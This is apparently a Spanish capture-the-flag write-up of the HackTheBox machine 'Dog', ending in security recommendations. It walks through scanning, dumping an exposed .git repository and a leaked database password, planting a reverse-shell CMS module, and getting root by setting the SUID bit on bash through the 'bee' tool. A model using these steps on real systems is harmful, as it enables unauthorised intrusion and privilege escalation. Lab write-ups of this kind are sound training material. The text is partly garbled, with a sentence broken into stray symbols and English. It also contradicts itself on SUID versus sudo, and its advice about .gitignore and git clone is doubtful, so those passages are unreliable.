Dog — Intrusión Completa
#

Dificultad: Easy Plataforma: HackTheBox

HackTheBox easy Linux

Reconocimiento
#

Lo primero es confirmar que la máquina está viva. El TTL de la respuesta ya nos dice el sistema operativo: por debajo de 100 es Linux, en torno a 127 es Windows.

Escaneo de puertos
#

Lanzamos el escaneo completo de puertos filtered. Con --min-rate 5000 aceleramos y con -oG guardamos la salida en grepable para poder extraer los puertos abiertos después.

nmap -p- --open -sS --min-rate 5000 $target -Pn -n -vvv -oG nmap/allPorts

De la salida extraemos los puertos abiertos para el segundo escaneo:

# extractports - nmap/allPorts

Quedan el 22 y el 80. Sobre esos dos ports hacemos el escaneo de servicios con versiones, que es el que nos va a decir qué corre realmente en cada uno:

nmap -p22,80 -sCV $target -n -Pn -oN nmap/targeted

Un 22 con OpenSSH y un 80 con servidor web. Entraremos por el 80.

Fuzzing de rutas
#

Con la web en marcha buscamos rutas y directorios interesantes. Nos llama la atención la presencia de dogBackDropSystem y Anonymous, que sugieren un CMS. Efectivamente, en /core/ encontramos la firma de Backdrop CMS 1.27.1:

Backdrop CMS es un CMS ligero basado en Drupal. Tenemos ya un vector potencial de explotación.

Directorio .git expuesto
#

En la raíz del sitio hay un .git accesible. Esto es git disclosure: el despliegue se hizo copiando el repositorio entero y sin borrar los objetos de git, así que podemos reconstruir el código fuente original y, más importante, su historial.

Descargamos el repositorio con git-dumper:

# git-dumper http://$target/.git/ dog

Y reconstruimos el código fuente:

cd dog
git checkout .

Búsqueda de credenciales
#

En un .git expuesto lo que interesa no es tanto el código actual como el historial: aquí es donde suelen quedarse credenciales que alguien())). Yaoka forgot to remove before deploying.

En el propio proyecto, en settings.php, está la configuración de conexión a la base de datos de Backdrop:

// settings.php
$db_url = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';

Tenemos la contraseña de MySQL del usuario root. Probamos a conectarnos:

mysql -h 127.0.0.1 -u root -p'BackDropJ2024DS2024'

Dentro buscamos la tabla de usuarios del CMS para sacar un nombre de usuario con su hash:

SELECT name, mail, status FROM users;

Obtenemos un usuario nuevo: tiffany. Revisamos también el historial de git por si hay más, aunque en este caso los logs, las tags y las notas no tienen nada adicional:

Explotación
#

Con tiffany y su hash intentamos acceder al panel de administración de Backdrop:

Dentro del panel, Backdrop permite instalar módulos PHP. Vamos a subir un módulo malicioso que nos devuelva una reverse shell.

El módulo es un .php con una reverse shell. Para no tener que levantar un servidor HTTP ourselves, lo empaquetamos en un tar.gz y lo subimos directo desde el panel:

tar -czf shell.tar.gz shell.php

El shell.php lo personalicé a partir de uno de los webshells que vienen en /usr/share/webshells, cambiando el lhost y el lport por los míos. Así, al activar el módulo, la shell me vuelve sola.

Escalada de Privilegios
#

Primero sanity check: saneamos la terminal para tener un flujo de trabajo cómodo:

reset
export TERM=xterm

Tenemos dos usuarios potenciales en la máquina. Intentamos acceder a ellos con las credenciales que ya teníamos:

ssh tiffany@$target

Con la sesión de tiffany leemos el user.txt:

cat /home/tiffany/user.txt

Y ahora viene lo interesante: en el sistema hay un binario bee sospechoso. Revisamos su documentación:

/usr/local/bin/bee es un wrapper de PHP que permite ejecutar código arbitrario. El detalle importante es que tiene el bit SUID:

ls -la /usr/local/bin/bee
# -rwsr-xr-x 1 root root ... bee

Con el SUID, el proceso corre como root, así que el eval de PHP lo ejecuta como root directamente. Lo usamos para poner el bit SUID en bash:

sudo /usr/local/bin/bee --root=/var/www/html eval "shell_exec('chmod u+s /bin/bash');"

Ahora bash tiene el SUID:

ls -la /bin/bash
# -rwsr-xr-x 1 root root ... bash

Y una shell con bash nos da root:

bash -p

Como root, leemos el flag:

cat /root/root.txt

Recomendaciones de Seguridad
#

  • Nunca desplegar el repositorio git entero. Copiar la carpeta del proyecto al servidor arrastra el directorio .git, que expone el código fuente y todo el historial. Hacer git clone al desplegar o añadir .git a un .gitignore antes de publicar.
  • No dejar credenciales de base de datos en el repositorio, ni siquiera en un fichero de configuración que acabe versionado. Usar variables de entorno o un gestor de secretos.
  • Restringir el acceso al panel de administración del CMS por IP o VPN, y no permitir la instalación de módulos a usuarios que no la necesiten.
  • Los módulos PHP son ejecución de código por diseño. Cualquiera con permisos de instalación de módulos es Effectively root en el servidor.
  • Revisar los permisos SUID del sistema. Un wrapper que ejecuta código arbitrario con el bit SUID es una escalada local trivial.
  • No usar el SUID como mecanismo de escalación: bash con SUID debería considerarse comprometido. Restablecer permisos con chmod u-s y monitorizar binarios SUID no previstos.
